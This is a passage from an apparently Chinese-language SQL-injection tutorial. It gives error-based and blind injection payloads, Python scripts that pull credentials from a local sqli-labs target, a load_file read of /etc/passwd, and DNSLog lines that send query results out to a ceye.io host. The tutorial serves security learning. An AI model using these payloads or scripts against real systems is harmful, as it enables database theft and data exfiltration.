class=\"line\">extractvalue(1,1) 一共可以接收两个参数，报错位置在第二个参数</span><br><span class=\"line\">extravalue(xml标记片段,xpath表达式) 对xml文档在xpath路径进行查询的函数</span><br><span class=\"line\">报错时返回非法内容,即利用xpath路径错误报错</span><br><span class=\"line\"></span><br><span class=\"line\">extractvalue(1,concat(0x7e,(select user()),0x7e))--+</span><br><span class=\"line\">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32,就需要用substring()函数截取，一次查看32位,或者使用limit单次查询</span><br><span class=\"line\">and extractvalue(1,concat(0x7e,substring((select group_concat(username,&quot;:&quot;,password)from users),1,32),0x7e))--+</span><br></pre></td></tr></table></figure>\n<p>报错注入总结：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213222739771.png\" alt=\"image-20220213222739771\"></p>\n<h5 id=\"盲注\"><a class=\"markdownIt-Anchor\" href=\"#盲注\">#</a> 盲注</h5>\n<p>在 SQL 注入过程中，SQL 语句执行后，选择的数据不能回显到前端页面，此时需要利用一些</p>\n<p>方法进行判断或者尝试，这个过程称之为盲注。</p>\n<p>在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响 应时间不同）。一般情况下，盲注可分为两类：</p>\n<p>基于布尔的盲注（Boolean based）</p>\n<p>基于时间的盲注（Time based）</p>\n<p>1. 基于布尔的盲注</p>\n<p>某些场合下，页面返回的结果只有两种（正常或错误）。通过构造 SQL 判断语句，查看页 面的返回结果（True or False）来判断哪些 SQL 判断条件成立，通过此来获取数据库中的 数据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前一个为0，后一个为真是or=1</span><br><span class=\"line\">id=-1&#x27; or (select substr(version(),1,1)=&#x27;5&#x27;) # </span><br><span class=\"line\">或使用left截取字符</span><br><span class=\"line\">?id=1&#x27; and left(version(),1)=5--+  &#x27;</span><br><span class=\"line\">如果此时不报错或有回显，说明version的第一个字符为5</span><br><span class=\"line\">id=-1&#x27; or (select 1 from information_schema.tables where table_schema=database() and substr(table_name,1,1)=&#x27;u&#x27; limit 0,1) #   </span><br><span class=\"line\">此时不报错或有回显说明第一字符为u</span><br><span class=\"line\">或者根据ASCII值来判断</span><br><span class=\"line\">id=-1&#x27; or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)&gt;100 #   </span><br><span class=\"line\">每次取子串，逐个获取对应的ASCII值，获取完整内容</span><br><span class=\"line\">mid(&#x27;abcd&#x27;,1,1)  //a</span><br><span class=\"line\">substring(&#x27;abcd&#x27;,1,1)  //a</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">或者使用Burp Suite  Intruder</span><br><span class=\"line\">Position  Sniper 只能设置一个变量</span><br><span class=\"line\">设置paylaod</span><br><span class=\"line\">attack后会根据设置的值发包，根据可能的Length排序找到正确的值</span><br><span class=\"line\"></span><br><span class=\"line\">Battering ram 可以接收两个参数</span><br><span class=\"line\">pitchfork 配置两个参数</span><br><span class=\"line\">cluster 组合所有可能性发包</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>根据是否有正确的回显判断</p>\n<p>2. 基于时间的盲注</p>\n<p>又称延时注入，即使用具有延时功能的函数 sleep、benchmark 等，通过判断这些函数是 否正常执行来获取数据库中的数据。</p>\n<p>和布尔盲注的区别在于，无论查询是否成功，前端的页面都一样，而布尔的前提是页面针对是否查询出来有相应的回显</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; or sleep(3) % 23</span><br><span class=\"line\">?id=1&#x27; or if((select table_name from information_schema.tables where table_schema=database() limit 0,1)&gt;0,sleep(2),0) #</span><br><span class=\"line\">根据对应的ASCII判断，如果正确停两秒</span><br><span class=\"line\">?id= 1 if((select ascii(substr(table_name,1,1))from information_scheam.tables where table_schema=database() limit 0,1)&gt;96,sleep(2),0) %23</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+</span><br><span class=\"line\">通过逐个字符与ASCII比对，逐个遍历出所有需要的数据</span><br><span class=\"line\">比如database()，数据库长度length(database())</span><br></pre></td></tr></table></figure>\n<p>3. 通过 python 脚本或 sqlmap 进行盲注</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#基于bool盲注</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url1 = <span class=\"string\">&quot;http://127.0.0.1/sqllabs/Less-5/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_database</span>(<span class=\"params\">url1</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;1&#x27; and ascii(substr((select database()),%d,1)) &gt; %d-- &quot;</span> % (i, mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&quot;id&quot;</span>: payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url1, params=params)</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># payload = url.format(_ = i, __ = mid)</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\"># r = requests.get(payload)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_table</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;sqli&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&#x27;id&#x27;</span>:payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url,params = params)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_column</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&#x27;id&#x27;</span>:payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url,params = params)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">inject_database(url)</span><br><span class=\"line\"><span class=\"comment\"># inject_table(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_column(url)</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#基于时间盲注</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/sqllabs/Less-15/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_database</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;admin&#x27; and if(ascii(substr((select database()),%d,1))&gt;%d,sleep(1),0)#&quot;</span> % (i, mid)</span><br><span class=\"line\">            data = &#123;<span class=\"string\">&#x27;uname&#x27;</span>: payload, <span class=\"string\">&#x27;passwd&#x27;</span>: <span class=\"string\">&#x27;aaaaa&#x27;</span>&#125;</span><br><span class=\"line\">            <span class=\"comment\">#params = &#123;&quot;id&quot;: payload&#125;</span></span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.post(url, data=data)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_table</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_column</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_data</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select concat(username,0x3a,password) from users limit 0,1),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">inject_database(url)</span><br><span class=\"line\"><span class=\"comment\"># inject_table(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_column(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_data(url)</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>注意：</p>\n<p>在 sqllabs 中前 10 关是 get 注入，参数为 id，通过 union select 必须前面查询无结果 union select 才能查询出内容</p>\n<p>在 sqllabs 中 11-14 关是 post 注入，如果采用报错注入，无关注入参数</p>\n<p>但 sqllabs15 关只能使用时间盲注，必须保证注入参数中必须能查询到正确的内容，或者使用 or，最后使用 and ‘1’='1 闭合，但 or 会有 and 和 or 优先级问题。</p>\n<p>mysql 中 and 优先级 高级 or</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) #</p>\n<p>dumb’ and  if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) #</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) and ‘1’='1</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) or ‘1’='1</p>\n<p>或者使用 bool 盲注</p>\n<p>判断是否存在 flag.jpg</p>\n<h5 id=\"搜索注入\"><a class=\"markdownIt-Anchor\" href=\"#搜索注入\">#</a> 搜索注入</h5>\n<p>在 like%% 中注入</p>\n<h5 id=\"dnslog注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog注入\">#</a> DNSLog 注入</h5>\n<p>前提条件：secure_file_priv 为空</p>\n<p>关于 secure_file_priv :</p>\n<blockquote>\n<p>secure_file_priv 特性，有三种状态</p>\n<ol>\n<li>secure_file_priv 为 null  表示不允许导入导出</li>\n<li>secure_file_priv 指定文件夹时，表示 mysql 的导入导出只能发生在指定的文件夹</li>\n<li>secure_file_priv 没有设置时，则表示没有任何限制</li>\n</ol>\n</blockquote>\n<p>注入使用 load_file 函数</p>\n<p>关于 load_file 函数</p>\n<blockquote>\n<p>LOAD_FILE () 函数读取一个文件并将其内容作为字符串返回</p>\n<p>语法为：load_file (file_name)，其中 file_name 是文件的完整路径</p>\n<p>此函数使用需要满足的条件</p>\n<p>文件必须位于服务器主机上<br>\n你必须具有该 FILE 权限才能读取该文件。拥有该 FILE 权限的用户可以读取服务器主机上的任何文件，该文件是 world-readable 的或 MySQL 服务器可读的，此属性与 secure_file_priv 状态相关<br>\n文件必须是所有人都可读的，并且它的大小小于 max_allowed_packet 字节</p>\n<p>select load_file(’/etc/passwd’);</p>\n</blockquote>\n<p>注入时需要使用 UNC 路径</p>\n<blockquote>\n<p>UNC 路径就是类似 \\softer 这样的形式的网络路径。它符合 \\servername\\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。</p>\n<p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\\servername\\sharename\\directory\\filename。</p>\n<p>例如把自己电脑的文件共享，你会获得如下路径，这就是 UNC 路径</p>\n</blockquote>\n<p>常用的 DNSLog 平台</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2NleWUuaW8v\">CEYE - Monitor service for security testing</span></p>\n<p>注入方式：<br>\n1. 注册上述平台，获取自己的 Identifier</p>\n<p>2. 在 payloads 页面找到官方给出的不同数据库适用的 payload</p>\n<p>3. 到测试目标修改并输入 payload</p>\n<p>4. 如果可以明显看到有页面加载的过程，说明外带成功</p>\n<p>下面使用 sqli 靶场做演示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br><span class=\"line\">and (select load_file(concat(&#x27;//&#x27;,(select hex(user())),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br></pre></td></tr></table></figure>\n<p>再到网页中 Records-&gt;DNS Query 即可到的注入的数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215231635316.png\" alt=\"image-20220215231635316\"></p>\n<p>注意：如果注入的字符中带有非法字符，比如 &quot;@&quot;, 需要使用 hex () 进行 16 进制编码，获取数据后在进行解码</p>\n<blockquote>\n<p><span class=\"exturl\" 